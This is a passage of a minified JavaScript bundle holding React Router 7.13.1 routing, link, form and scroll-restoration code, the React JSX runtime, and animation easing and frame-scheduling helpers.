/> with a null value by default resulting in an "empty" page.`);let h=yt(m&&m.map(e=>Object.assign({},e,{params:Object.assign({},o,e.params),pathname:Ne([c,r.encodeLocation?r.encodeLocation(e.pathname.replace(/\?/g,`%3F`).replace(/#/g,`%23`)).pathname:e.pathname]),pathnameBase:e.pathnameBase===`/`?c:Ne([c,r.encodeLocation?r.encodeLocation(e.pathnameBase.replace(/\?/g,`%3F`).replace(/#/g,`%23`)).pathname:e.pathnameBase])})),i,n);return t&&h?w.createElement(Ye.Provider,{value:{location:{pathname:`/`,search:``,hash:``,state:null,key:`default`,unstable_mask:void 0,...d},navigationType:`POP`}},h):h}function pt(){let e=Ot(),t=Re(e)?`${e.status} ${e.statusText}`:e instanceof Error?e.message:JSON.stringify(e),n=e instanceof Error?e.stack:null,r=`rgba(200,200,200, 0.5)`,i={padding:`0.5rem`,backgroundColor:r},a={padding:`2px 4px`,backgroundColor:r},o=null;return console.error(`Error handled by React Router default ErrorBoundary:`,e),o=w.createElement(w.Fragment,null,w.createElement(`p`,null,`💿 Hey developer 👋`),w.createElement(`p`,null,`You can provide a way better UX than this when your app throws errors by providing your own `,w.createElement(`code`,{style:a},`ErrorBoundary`),` or`,` `,w.createElement(`code`,{style:a},`errorElement`),` prop on your route.`)),w.createElement(w.Fragment,null,w.createElement(`h2`,null,`Unexpected Application Error!`),w.createElement(`h3`,{style:{fontStyle:`italic`}},t),n?w.createElement(`pre`,{style:i},n):null,o)}var mt=w.createElement(pt,null),ht=class extends w.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,t){return t.location!==e.location||t.revalidation!==`idle`&&e.revalidation===`idle`?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error===void 0?t.error:e.error,location:t.location,revalidation:e.revalidation||t.revalidation}}componentDidCatch(e,t){this.props.onError?this.props.onError(e,t):console.error(`React Router caught the following error during render`,e)}render(){let e=this.state.error;if(this.context&&typeof e==`object`&&e&&`digest`in e&&typeof e.digest==`string`){let t=nt(e.digest);t&&(e=t)}let t=e===void 0?this.props.children:w.createElement(Xe.Provider,{value:this.props.routeContext},w.createElement(Ze.Provider,{value:e,children:this.props.component}));return this.context?w.createElement(_t,{error:e},t):t}};ht.contextType=We;var gt=new WeakMap;function _t({children:e,error:t}){let{basename:n}=w.useContext(Je);if(typeof t==`object`&&t&&`digest`in t&&typeof t.digest==`string`){let e=tt(t.digest);if(e){let r=gt.get(t);if(r)throw r;let i=Ve(e.location,n);if(Be&&!gt.get(t))if(i.isExternal||e.reloadDocument)window.location.href=i.absoluteURL||i.to;else{let n=Promise.resolve().then(()=>window.__reactRouterDataRouter.navigate(i.to,{replace:e.replace}));throw gt.set(t,n),n}return w.createElement(`meta`,{httpEquiv:`refresh`,content:`0;url=${i.absoluteURL||i.to}`})}}return e}function vt({routeContext:e,match:t,children:n}){let r=w.useContext(He);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),w.createElement(Xe.Provider,{value:e},n)}function yt(e,t=[],n){let r=n?.state;if(e==null){if(!r)return null;if(r.errors)e=r.matches;else if(t.length===0&&!r.initialized&&r.matches.length>0)e=r.matches;else return null}let i=e,a=r?.errors;if(a!=null){let e=i.findIndex(e=>e.route.id&&a?.[e.route.id]!==void 0);D(e>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(a).join(`,`)}`),i=i.slice(0,Math.min(i.length,e+1))}let o=!1,s=-1;if(n&&r){o=r.renderFallback;for(let e=0;e<i.length;e++){let t=i[e];if((t.route.HydrateFallback||t.route.hydrateFallbackElement)&&(s=e),t.route.id){let{loaderData:e,errors:a}=r,c=t.route.loader&&!e.hasOwnProperty(t.route.id)&&(!a||a[t.route.id]===void 0);if(t.route.lazy||c){n.isStatic&&(o=!0),i=s>=0?i.slice(0,s+1):[i[0]];break}}}}let c=n?.onError,l=r&&c?(e,t)=>{c(e,{location:r.location,params:r.matches?.[0]?.params??{},unstable_pattern:ze(r.matches),errorInfo:t})}:void 0;return i.reduceRight((e,n,c)=>{let u,d=!1,f=null,p=null;r&&(u=a&&n.route.id?a[n.route.id]:void 0,f=n.route.errorElement||mt,o&&(s<0&&c===0?(jt(`route-fallback`,!1,"No `HydrateFallback` element provided to render during initial hydration"),d=!0,p=null):s===c&&(d=!0,p=n.route.hydrateFallbackElement||null)));let m=t.concat(i.slice(0,c+1)),h=()=>{let t;return t=u?f:d?p:n.route.Component?w.createElement(n.route.Component,null):n.route.element?n.route.element:e,w.createElement(vt,{match:n,routeContext:{outlet:e,matches:m,isDataRoute:r!=null},children:t})};return r&&(n.route.ErrorBoundary||n.route.errorElement||c===0)?w.createElement(ht,{location:r.location,revalidation:r.revalidation,component:f,error:u,children:h(),routeContext:{outlet:null,matches:m,isDataRoute:!0},onError:l}):h()},null)}function bt(e){return`${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function xt(e){let t=w.useContext(He);return D(t,bt(e)),t}function St(e){let t=w.useContext(Ue);return D(t,bt(e)),t}function Ct(e){let t=w.useContext(Xe);return D(t,bt(e)),t}function wt(e){let t=Ct(e),n=t.matches[t.matches.length-1];return D(n.route.id,`${e} can only be used on routes that contain a unique "id"`),n.route.id}function Tt(){return wt(`useRouteId`)}function Et(){return St(`useNavigation`).navigation}function Dt(){let{matches:e,loaderData:t}=St(`useMatches`);return w.useMemo(()=>e.map(e=>ce(e,t)),[e,t])}function Ot(){let e=w.useContext(Ze),t=St(`useRouteError`),n=wt(`useRouteError`);return e===void 0?t.errors?.[n]:e}function kt(){let{router:e}=xt(`useNavigate`),t=wt(`useNavigate`),n=w.useRef(!1);return st(()=>{n.current=!0}),w.useCallback(async(r,i={})=>{O(n.current,ot),n.current&&(typeof r==`number`?await e.navigate(r):await e.navigate(r,{fromRouteId:t,...i}))},[e,t])}var At={};function jt(e,t,n){!t&&!At[e]&&(At[e]=!0,O(!1,n))}w.useOptimistic,w.memo(Mt);function Mt({routes:e,future:t,state:n,isStatic:r,onError:i}){return ft(e,void 0,{state:n,isStatic:r,onError:i,future:t})}function Nt(e){D(!1,`A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.`)}function Pt({basename:e=`/`,children:t=null,location:n,navigationType:r=`POP`,navigator:i,static:a=!1,unstable_useTransitions:o}){D(!it(),`You cannot render a <Router> inside another <Router>. You should never have more than one in your app.`);let s=e.replace(/^\/*/,`/`),c=w.useMemo(()=>({basename:s,navigator:i,static:a,unstable_useTransitions:o,future:{}}),[s,i,a,o]);typeof n==`string`&&(n=ae(n));let{pathname:l=`/`,search:u=``,hash:d=``,state:f=null,key:p=`default`,unstable_mask:m}=n,h=w.useMemo(()=>{let e=Te(l,s);return e==null?null:{location:{pathname:e,search:u,hash:d,state:f,key:p,unstable_mask:m},navigationType:r}},[s,l,u,d,f,p,r,m]);return O(h!=null,`<Router basename="${s}"> is not able to match the URL "${l}${u}${d}" because it does not start with the basename, so the <Router> won't render anything.`),h==null?null:w.createElement(Je.Provider,{value:c},w.createElement(Ye.Provider,{children:t,value:h}))}function Ft({children:e,location:t}){return dt(It(e),t)}function It(e,t=[]){let n=[];return w.Children.forEach(e,(e,r)=>{if(!w.isValidElement(e))return;let i=[...t,r];if(e.type===w.Fragment){n.push.apply(n,It(e.props.children,i));return}D(e.type===Nt,`[${typeof e.type==`string`?e.type:e.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),D(!e.props.index||!e.props.children,`An index route cannot have child routes.`);let a={id:e.props.id||i.join(`-`),caseSensitive:e.props.caseSensitive,element:e.props.element,Component:e.props.Component,index:e.props.index,path:e.props.path,middleware:e.props.middleware,loader:e.props.loader,action:e.props.action,hydrateFallbackElement:e.props.hydrateFallbackElement,HydrateFallback:e.props.HydrateFallback,errorElement:e.props.errorElement,ErrorBoundary:e.props.ErrorBoundary,hasErrorBoundary:e.props.hasErrorBoundary===!0||e.props.ErrorBoundary!=null||e.props.errorElement!=null,shouldRevalidate:e.props.shouldRevalidate,handle:e.props.handle,lazy:e.props.lazy};e.props.children&&(a.children=It(e.props.children,i)),n.push(a)}),n}var Lt=`get`,Rt=`application/x-www-form-urlencoded`;function zt(e){return typeof HTMLElement<`u`&&e instanceof HTMLElement}function Bt(e){return zt(e)&&e.tagName.toLowerCase()===`button`}function Vt(e){return zt(e)&&e.tagName.toLowerCase()===`form`}function Ht(e){return zt(e)&&e.tagName.toLowerCase()===`input`}function Ut(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function Wt(e,t){return e.button===0&&(!t||t===`_self`)&&!Ut(e)}var Gt=null;function Kt(){if(Gt===null)try{new FormData(document.createElement(`form`),0),Gt=!1}catch{Gt=!0}return Gt}var qt=new Set([`application/x-www-form-urlencoded`,`multipart/form-data`,`text/plain`]);function Jt(e){return e!=null&&!qt.has(e)?(O(!1,`"${e}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Rt}"`),null):e}function Yt(e,t){let n,r,i,a,o;if(Vt(e)){let o=e.getAttribute(`action`);r=o?Te(o,t):null,n=e.getAttribute(`method`)||Lt,i=Jt(e.getAttribute(`enctype`))||Rt,a=new FormData(e)}else if(Bt(e)||Ht(e)&&(e.type===`submit`||e.type===`image`)){let o=e.form;if(o==null)throw Error(`Cannot submit a <button> or <input type="submit"> without a <form>`);let s=e.getAttribute(`formaction`)||o.getAttribute(`action`);if(r=s?Te(s,t):null,n=e.getAttribute(`formmethod`)||o.getAttribute(`method`)||Lt,i=Jt(e.getAttribute(`formenctype`))||Jt(o.getAttribute(`enctype`))||Rt,a=new FormData(o,e),!Kt()){let{name:t,type:n,value:r}=e;if(n===`image`){let e=t?`${t}.`:``;a.append(`${e}x`,`0`),a.append(`${e}y`,`0`)}else t&&a.append(t,r)}}else if(zt(e))throw Error(`Cannot submit element that is not <form>, <button>, or <input type="submit|image">`);else n=Lt,r=null,i=Rt,o=e;return a&&i===`text/plain`&&(o=a,a=void 0),{action:r,method:n.toLowerCase(),encType:i,formData:a,body:o}}Object.getOwnPropertyNames(Object.prototype).sort().join(`\0`);var Xt={"&":`\\u0026`,">":`\\u003e`,"<":`\\u003c`,"\u2028":`\\u2028`,"\u2029":`\\u2029`},Zt=/[&><\u2028\u2029]/g;function Qt(e){return e.replace(Zt,e=>Xt[e])}function $t(e,t){if(e===!1||e==null)throw Error(t)}function en(e,t,n,r){let i=typeof e==`string`?new URL(e,typeof window>`u`?`server://singlefetch/`:window.location.origin):e;return n?i.pathname.endsWith(`/`)?i.pathname=`${i.pathname}_.${r}`:i.pathname=`${i.pathname}.${r}`:i.pathname===`/`?i.pathname=`_root.${r}`:t&&Te(i.pathname,t)===`/`?i.pathname=`${t.replace(/\/$/,``)}/_root.${r}`:i.pathname=`${i.pathname.replace(/\/$/,``)}.${r}`,i}async function tn(e,t){if(e.id in t)return t[e.id];try{let n=await C(()=>import(e.module),[]);return t[e.id]=n,n}catch(t){return console.error(`Error loading route module \`${e.module}\`, reloading page...`),console.error(t),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function nn(e){return e!=null&&typeof e.page==`string`}function rn(e){return e==null?!1:e.href==null?e.rel===`preload`&&typeof e.imageSrcSet==`string`&&typeof e.imageSizes==`string`:typeof e.rel==`string`&&typeof e.href==`string`}async function an(e,t,n){return un((await Promise.all(e.map(async e=>{let r=t.routes[e.route.id];if(r){let e=await tn(r,n);return e.links?e.links():[]}return[]}))).flat(1).filter(rn).filter(e=>e.rel===`stylesheet`||e.rel===`preload`).map(e=>e.rel===`stylesheet`?{...e,rel:`prefetch`,as:`style`}:{...e,rel:`prefetch`}))}function on(e,t,n,r,i,a){let o=(e,t)=>n[t]?e.route.id!==n[t].route.id:!0,s=(e,t)=>n[t].pathname!==e.pathname||n[t].route.path?.endsWith(`*`)&&n[t].params[`*`]!==e.params[`*`];return a===`assets`?t.filter((e,t)=>o(e,t)||s(e,t)):a===`data`?t.filter((t,a)=>{let c=r.routes[t.route.id];if(!c||!c.hasLoader)return!1;if(o(t,a)||s(t,a))return!0;if(t.route.shouldRevalidate){let r=t.route.shouldRevalidate({currentUrl:new URL(i.pathname+i.search+i.hash,window.origin),currentParams:n[0]?.params||{},nextUrl:new URL(e,window.origin),nextParams:t.params,defaultShouldRevalidate:!0});if(typeof r==`boolean`)return r}return!0}):[]}function sn(e,t,{includeHydrateFallback:n}={}){return cn(e.map(e=>{let r=t.routes[e.route.id];if(!r)return[];let i=[r.module];return r.clientActionModule&&(i=i.concat(r.clientActionModule)),r.clientLoaderModule&&(i=i.concat(r.clientLoaderModule)),n&&r.hydrateFallbackModule&&(i=i.concat(r.hydrateFallbackModule)),r.imports&&(i=i.concat(r.imports)),i}).flat(1))}function cn(e){return[...new Set(e)]}function ln(e){let t={},n=Object.keys(e).sort();for(let r of n)t[r]=e[r];return t}function un(e,t){let n=new Set,r=new Set(t);return e.reduce((e,i)=>{if(t&&!nn(i)&&i.as===`script`&&i.href&&r.has(i.href))return e;let a=JSON.stringify(ln(i));return n.has(a)||(n.add(a),e.push({key:a,link:i})),e},[])}function dn(){let e=w.useContext(He);return $t(e,`You must render this element inside a <DataRouterContext.Provider> element`),e}function fn(){let e=w.useContext(Ue);return $t(e,`You must render this element inside a <DataRouterStateContext.Provider> element`),e}var pn=w.createContext(void 0);pn.displayName=`FrameworkContext`;function mn(){let e=w.useContext(pn);return $t(e,`You must render this element inside a <HydratedRouter> element`),e}function hn(e,t){let n=w.useContext(pn),[r,i]=w.useState(!1),[a,o]=w.useState(!1),{onFocus:s,onBlur:c,onMouseEnter:l,onMouseLeave:u,onTouchStart:d}=t,f=w.useRef(null);w.useEffect(()=>{if(e===`render`&&o(!0),e===`viewport`){let e=new IntersectionObserver(e=>{e.forEach(e=>{o(e.isIntersecting)})},{threshold:.5});return f.current&&e.observe(f.current),()=>{e.disconnect()}}},[e]),w.useEffect(()=>{if(r){let e=setTimeout(()=>{o(!0)},100);return()=>{clearTimeout(e)}}},[r]);let p=()=>{i(!0)},m=()=>{i(!1),o(!1)};return n?e===`intent`?[a,f,{onFocus:gn(s,p),onBlur:gn(c,m),onMouseEnter:gn(l,p),onMouseLeave:gn(u,m),onTouchStart:gn(d,p)}]:[a,f,{}]:[!1,f,{}]}function gn(e,t){return n=>{e&&e(n),n.defaultPrevented||t(n)}}function _n({page:e,...t}){let{router:n}=dn(),r=w.useMemo(()=>A(n.routes,e,n.basename),[n.routes,e,n.basename]);return r?w.createElement(yn,{page:e,matches:r,...t}):null}function vn(e){let{manifest:t,routeModules:n}=mn(),[r,i]=w.useState([]);return w.useEffect(()=>{let r=!1;return an(e,t,n).then(e=>{r||i(e)}),()=>{r=!0}},[e,t,n]),r}function yn({page:e,matches:t,...n}){let r=at(),{future:i,manifest:a,routeModules:o}=mn(),{basename:s}=dn(),{loaderData:c,matches:l}=fn(),u=w.useMemo(()=>on(e,t,l,a,r,`data`),[e,t,l,a,r]),d=w.useMemo(()=>on(e,t,l,a,r,`assets`),[e,t,l,a,r]),f=w.useMemo(()=>{if(e===r.pathname+r.search+r.hash)return[];let n=new Set,l=!1;if(t.forEach(e=>{let t=a.routes[e.route.id];!t||!t.hasLoader||(!u.some(t=>t.route.id===e.route.id)&&e.route.id in c&&o[e.route.id]?.shouldRevalidate||t.hasClientLoader?l=!0:n.add(e.route.id))}),n.size===0)return[];let d=en(e,s,i.unstable_trailingSlashAwareDataRequests,`data`);return l&&n.size>0&&d.searchParams.set(`_routes`,t.filter(e=>n.has(e.route.id)).map(e=>e.route.id).join(`,`)),[d.pathname+d.search]},[s,i.unstable_trailingSlashAwareDataRequests,c,r,a,u,t,e,o]),p=w.useMemo(()=>sn(d,a),[d,a]),m=vn(d);return w.createElement(w.Fragment,null,f.map(e=>w.createElement(`link`,{key:e,rel:`prefetch`,as:`fetch`,href:e,...n})),p.map(e=>w.createElement(`link`,{key:e,rel:`modulepreload`,href:e,...n})),m.map(({key:e,link:t})=>w.createElement(`link`,{key:e,nonce:n.nonce,...t,crossOrigin:t.crossOrigin??n.crossOrigin})))}function bn(...e){return t=>{e.forEach(e=>{typeof e==`function`?e(t):e!=null&&(e.current=t)})}}var xn=typeof window<`u`&&window.document!==void 0&&window.document.createElement!==void 0;try{xn&&(window.__reactRouterVersion=`7.13.1`)}catch{}function Sn({basename:e,children:t,unstable_useTransitions:n,window:r}){let i=w.useRef();i.current??=ee({window:r,v5Compat:!0});let a=i.current,[o,s]=w.useState({action:a.action,location:a.location}),c=w.useCallback(e=>{n===!1?s(e):w.startTransition(()=>s(e))},[n]);return w.useLayoutEffect(()=>a.listen(c),[a,c]),w.createElement(Pt,{basename:e,children:t,location:o.location,navigationType:o.action,navigator:a,unstable_useTransitions:n})}function Cn({basename:e,children:t,history:n,unstable_useTransitions:r}){let[i,a]=w.useState({action:n.action,location:n.location}),o=w.useCallback(e=>{r===!1?a(e):w.startTransition(()=>a(e))},[r]);return w.useLayoutEffect(()=>n.listen(o),[n,o]),w.createElement(Pt,{basename:e,children:t,location:i.location,navigationType:i.action,navigator:n,unstable_useTransitions:r})}Cn.displayName=`unstable_HistoryRouter`;var wn=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Tn=w.forwardRef(function({onClick:e,discover:t=`render`,prefetch:n=`none`,relative:r,reloadDocument:i,replace:a,unstable_mask:o,state:s,target:c,to:l,preventScrollReset:u,viewTransition:d,unstable_defaultShouldRevalidate:f,...p},m){let{basename:h,navigator:g,unstable_useTransitions:_}=w.useContext(Je),v=typeof l==`string`&&wn.test(l),y=Ve(l,h);l=y.to;let b=rt(l,{relative:r}),x=at(),S=null;if(o){let e=Me(o,[],x.unstable_mask?x.unstable_mask.pathname:`/`,!0);h!==`/`&&(e.pathname=e.pathname===`/`?h:Ne([h,e.pathname])),S=g.createHref(e)}let[C,T,E]=hn(n,p),ee=Mn(l,{replace:a,unstable_mask:o,state:s,target:c,preventScrollReset:u,relative:r,viewTransition:d,unstable_defaultShouldRevalidate:f,unstable_useTransitions:_});function D(t){e&&e(t),t.defaultPrevented||ee(t)}let O=!(y.isExternal||i),te=w.createElement(`a`,{...p,...E,href:(O?S:void 0)||y.absoluteURL||b,onClick:O?D:e,ref:bn(m,T),target:c,"data-discover":!v&&t===`render`?`true`:void 0});return C&&!v?w.createElement(w.Fragment,null,te,w.createElement(_n,{page:b})):te});Tn.displayName=`Link`;var En=w.forwardRef(function({"aria-current":e=`page`,caseSensitive:t=!1,className:n=``,end:r=!1,style:i,to:a,viewTransition:o,children:s,...c},l){let u=ut(a,{relative:c.relative}),d=at(),f=w.useContext(Ue),{navigator:p,basename:m}=w.useContext(Je),h=f!=null&&Hn(u)&&o===!0,g=p.encodeLocation?p.encodeLocation(u).pathname:u.pathname,_=d.pathname,v=f&&f.navigation&&f.navigation.location?f.navigation.location.pathname:null;t||(_=_.toLowerCase(),v=v?v.toLowerCase():null,g=g.toLowerCase()),v&&m&&(v=Te(v,m)||v);let y=g!==`/`&&g.endsWith(`/`)?g.length-1:g.length,b=_===g||!r&&_.startsWith(g)&&_.charAt(y)===`/`,x=v!=null&&(v===g||!r&&v.startsWith(g)&&v.charAt(g.length)===`/`),S={isActive:b,isPending:x,isTransitioning:h},C=b?e:void 0,T;T=typeof n==`function`?n(S):[n,b?`active`:null,x?`pending`:null,h?`transitioning`:null].filter(Boolean).join(` `);let E=typeof i==`function`?i(S):i;return w.createElement(Tn,{...c,"aria-current":C,className:T,ref:l,style:E,to:a,viewTransition:o},typeof s==`function`?s(S):s)});En.displayName=`NavLink`;var Dn=w.forwardRef(({discover:e=`render`,fetcherKey:t,navigate:n,reloadDocument:r,replace:i,state:a,method:o=Lt,action:s,onSubmit:c,relative:l,preventScrollReset:u,viewTransition:d,unstable_defaultShouldRevalidate:f,...p},m)=>{let{unstable_useTransitions:h}=w.useContext(Je),g=Fn(),_=In(s,{relative:l}),v=o.toLowerCase()===`get`?`get`:`post`,y=typeof s==`string`&&wn.test(s);return w.createElement(`form`,{ref:m,method:v,action:_,onSubmit:r?c:e=>{if(c&&c(e),e.defaultPrevented)return;e.preventDefault();let r=e.nativeEvent.submitter,s=r?.getAttribute(`formmethod`)||o,p=()=>g(r||e.currentTarget,{fetcherKey:t,method:s,navigate:n,replace:i,state:a,relative:l,preventScrollReset:u,viewTransition:d,unstable_defaultShouldRevalidate:f});h&&n!==!1?w.startTransition(()=>p()):p()},...p,"data-discover":!y&&e===`render`?`true`:void 0})});Dn.displayName=`Form`;function On({getKey:e,storageKey:t,...n}){let r=w.useContext(pn),{basename:i}=w.useContext(Je),a=at(),o=Dt();Bn({getKey:e,storageKey:t});let s=w.useMemo(()=>{if(!r||!e)return null;let t=zn(a,o,i,e);return t===a.key?null:t},[]);if(!r||r.isSpaMode)return null;let c=((e,t)=>{if(!window.history.state||!window.history.state.key){let e=Math.random().toString(32).slice(2);window.history.replaceState({key:e},``)}try{let n=JSON.parse(sessionStorage.getItem(e)||`{}`)[t||window.history.state.key];typeof n==`number`&&window.scrollTo(0,n)}catch(t){console.error(t),sessionStorage.removeItem(e)}}).toString();return w.createElement(`script`,{...n,suppressHydrationWarning:!0,dangerouslySetInnerHTML:{__html:`(${c})(${Qt(JSON.stringify(t||Ln))}, ${Qt(JSON.stringify(s))})`}})}On.displayName=`ScrollRestoration`;function kn(e){return`${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function An(e){let t=w.useContext(He);return D(t,kn(e)),t}function jn(e){let t=w.useContext(Ue);return D(t,kn(e)),t}function Mn(e,{target:t,replace:n,unstable_mask:r,state:i,preventScrollReset:a,relative:o,viewTransition:s,unstable_defaultShouldRevalidate:c,unstable_useTransitions:l}={}){let u=ct(),d=at(),f=ut(e,{relative:o});return w.useCallback(p=>{if(Wt(p,t)){p.preventDefault();let t=n===void 0?ie(d)===ie(f):n,m=()=>u(e,{replace:t,unstable_mask:r,state:i,preventScrollReset:a,relative:o,viewTransition:s,unstable_defaultShouldRevalidate:c});l?w.startTransition(()=>m()):m()}},[d,u,f,n,r,i,t,e,a,o,s,c,l])}var Nn=0,Pn=()=>`__${String(++Nn)}__`;function Fn(){let{router:e}=An(`useSubmit`),{basename:t}=w.useContext(Je),n=Tt(),r=e.fetch,i=e.navigate;return w.useCallback(async(e,a={})=>{let{action:o,method:s,encType:c,formData:l,body:u}=Yt(e,t);a.navigate===!1?await r(a.fetcherKey||Pn(),n,a.action||o,{unstable_defaultShouldRevalidate:a.unstable_defaultShouldRevalidate,preventScrollReset:a.preventScrollReset,formData:l,body:u,formMethod:a.method||s,formEncType:a.encType||c,flushSync:a.flushSync}):await i(a.action||o,{unstable_defaultShouldRevalidate:a.unstable_defaultShouldRevalidate,preventScrollReset:a.preventScrollReset,formData:l,body:u,formMethod:a.method||s,formEncType:a.encType||c,replace:a.replace,state:a.state,fromRouteId:n,flushSync:a.flushSync,viewTransition:a.viewTransition})},[r,i,t,n])}function In(e,{relative:t}={}){let{basename:n}=w.useContext(Je),r=w.useContext(Xe);D(r,`useFormAction must be used inside a RouteContext`);let[i]=r.matches.slice(-1),a={...ut(e||`.`,{relative:t})},o=at();if(e==null){a.search=o.search;let e=new URLSearchParams(a.search),t=e.getAll(`index`);if(t.some(e=>e===``)){e.delete(`index`),t.filter(e=>e).forEach(t=>e.append(`index`,t));let n=e.toString();a.search=n?`?${n}`:``}}return(!e||e===`.`)&&i.route.index&&(a.search=a.search?a.search.replace(/^\?/,`?index&`):`?index`),n!==`/`&&(a.pathname=a.pathname===`/`?n:Ne([n,a.pathname])),ie(a)}var Ln=`react-router-scroll-positions`,Rn={};function zn(e,t,n,r){let i=null;return r&&(i=r(n===`/`?e:{...e,pathname:Te(e.pathname,n)||e.pathname},t)),i??=e.key,i}function Bn({getKey:e,storageKey:t}={}){let{router:n}=An(`useScrollRestoration`),{restoreScrollPosition:r,preventScrollReset:i}=jn(`useScrollRestoration`),{basename:a}=w.useContext(Je),o=at(),s=Dt(),c=Et();w.useEffect(()=>(window.history.scrollRestoration=`manual`,()=>{window.history.scrollRestoration=`auto`}),[]),Vn(w.useCallback(()=>{if(c.state===`idle`){let t=zn(o,s,a,e);Rn[t]=window.scrollY}try{sessionStorage.setItem(t||Ln,JSON.stringify(Rn))}catch(e){O(!1,`Failed to save scroll positions in sessionStorage, <ScrollRestoration /> will not work properly (${e}).`)}window.history.scrollRestoration=`auto`},[c.state,e,a,o,s,t])),typeof document<`u`&&(w.useLayoutEffect(()=>{try{let e=sessionStorage.getItem(t||Ln);e&&(Rn=JSON.parse(e))}catch{}},[t]),w.useLayoutEffect(()=>{let t=n?.enableScrollRestoration(Rn,()=>window.scrollY,e?(t,n)=>zn(t,n,a,e):void 0);return()=>t&&t()},[n,a,e]),w.useLayoutEffect(()=>{if(r!==!1){if(typeof r==`number`){window.scrollTo(0,r);return}try{if(o.hash){let e=document.getElementById(decodeURIComponent(o.hash.slice(1)));if(e){e.scrollIntoView();return}}}catch{O(!1,`"${o.hash.slice(1)}" is not a decodable element ID. The view will not scroll to it.`)}i!==!0&&window.scrollTo(0,0)}},[o,r,i]))}function Vn(e,t){let{capture:n}=t||{};w.useEffect(()=>{let t=n==null?void 0:{capture:n};return window.addEventListener(`pagehide`,e,t),()=>{window.removeEventListener(`pagehide`,e,t)}},[e,n])}function Hn(e,{relative:t}={}){let n=w.useContext(Ge);D(n!=null,"`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");let{basename:r}=An(`useViewTransitionState`),i=ut(e,{relative:t});if(!n.isTransitioning)return!1;let a=Te(n.currentLocation.pathname,r)||n.currentLocation.pathname,o=Te(n.nextLocation.pathname,r)||n.nextLocation.pathname;return Se(i.pathname,o)!=null||Se(i.pathname,a)!=null}var Un=y(),Wn=s((e=>{var t=Symbol.for(`react.transitional.element`),n=Symbol.for(`react.fragment`);function r(e,n,r){var i=null;if(r!==void 0&&(i=``+r),n.key!==void 0&&(i=``+n.key),`key`in n)for(var a in r={},n)a!==`key`&&(r[a]=n[a]);else r=n;return n=r.ref,{$$typeof:t,type:e,key:i,ref:n===void 0?null:n,props:r}}e.Fragment=n,e.jsx=r,e.jsxs=r})),Gn=s(((e,t)=>{t.exports=Wn()})),Kn=(0,w.createContext)({});function qn(e){let t=(0,w.useRef)(null);return t.current===null&&(t.current=e()),t.current}var Jn=typeof window<`u`?w.useLayoutEffect:w.useEffect,Yn=(0,w.createContext)(null);function Xn(e,t){e.indexOf(t)===-1&&e.push(t)}function Zn(e,t){let n=e.indexOf(t);n>-1&&e.splice(n,1)}var Qn=(e,t,n)=>n>t?t:n<e?e:n,$n={},er=e=>/^-?(?:\d+(?:\.\d+)?|\.\d+)$/u.test(e);function tr(e){return typeof e==`object`&&!!e}var nr=e=>/^0[^.\s]+$/u.test(e);function rr(e){let t;return()=>(t===void 0&&(t=e()),t)}var ir=e=>e,ar=(e,t)=>n=>t(e(n)),or=(...e)=>e.reduce(ar),sr=(e,t,n)=>{let r=t-e;return r===0?1:(n-e)/r},cr=class{constructor(){this.subscriptions=[]}add(e){return Xn(this.subscriptions,e),()=>Zn(this.subscriptions,e)}notify(e,t,n){let r=this.subscriptions.length;if(r)if(r===1)this.subscriptions[0](e,t,n);else for(let i=0;i<r;i++){let r=this.subscriptions[i];r&&r(e,t,n)}}getSize(){return this.subscriptions.length}clear(){this.subscriptions.length=0}},lr=e=>e*1e3,ur=e=>e/1e3;function dr(e,t){return t?1e3/t*e:0}var fr=(e,t,n)=>(((1-3*n+3*t)*e+(3*n-6*t))*e+3*t)*e,pr=1e-7,mr=12;function hr(e,t,n,r,i){let a,o,s=0;do o=t+(n-t)/2,a=fr(o,r,i)-e,a>0?n=o:t=o;while(Math.abs(a)>pr&&++s<mr);return o}function gr(e,t,n,r){if(e===t&&n===r)return ir;let i=t=>hr(t,0,1,e,n);return e=>e===0||e===1?e:fr(i(e),t,r)}var _r=e=>t=>t<=.5?e(2*t)/2:(2-e(2*(1-t)))/2,vr=e=>t=>1-e(1-t),yr=gr(.33,1.53,.69,.99),br=vr(yr),xr=_r(br),Sr=e=>e>=1?1:(e*=2)<1?.5*br(e):.5*(2-2**(-10*(e-1))),Cr=e=>1-Math.sin(Math.acos(e)),wr=vr(Cr),Tr=_r(Cr),Er=gr(.42,0,1,1),Dr=gr(0,0,.58,1),Or=gr(.42,0,.58,1),kr=e=>Array.isArray(e)&&typeof e[0]!=`number`,Ar=e=>Array.isArray(e)&&typeof e[0]==`number`,jr={linear:ir,easeIn:Er,easeInOut:Or,easeOut:Dr,circIn:Cr,circInOut:Tr,circOut:wr,backIn:br,backInOut:xr,backOut:yr,anticipate:Sr},Mr=e=>typeof e==`string`,Nr=e=>{if(Ar(e)){e.length;let[t,n,r,i]=e;return gr(t,n,r,i)}else if(Mr(e))return jr[e],`${e}`,jr[e];return e},Pr=[`setup`,`read`,`resolveKeyframes`,`preUpdate`,`update`,`preRender`,`render`,`postRender`],Fr={value:null,addProjectionMetrics:null};function Ir(e,t){let n=new Set,r=new Set,i=!1,a=!1,o=new WeakSet,s={delta:0,timestamp:0,isProcessing:!1},c=0;function l(t){o.has(t)&&(u.schedule(t),e()),c++,t(s)}let u={schedule:(e,t=!1,a=!1)=>{let s=a&&i?n:r;return t&&o.add(e),s.add(e),e},cancel:e=>{r.delete(e),o.delete(e)},process:e=>{if(s=e,i){a=!0;return}i=!0;let 